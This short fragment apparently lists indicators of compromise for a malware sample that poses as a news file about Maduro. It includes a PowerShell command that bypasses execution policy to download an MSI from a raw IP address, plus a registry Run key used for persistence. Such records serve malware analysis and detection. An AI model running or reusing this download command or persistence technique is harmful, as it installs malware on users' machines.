  processes:
  - Maduro to be taken to New York.exe
  - DataTechnology.exe
  - powershell.exe
  commandline:
  - DataTechnology.exe --DATA
  - powershell.exe -ExecutionPolicy Bypass -NoProfile -Command (New-Object System.Net.WebClient).DownloadFile("http://45.9.149.112:15330/44.235.83.125/a.msi",
    "a.msi")
  registry_keys:
  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Lite360
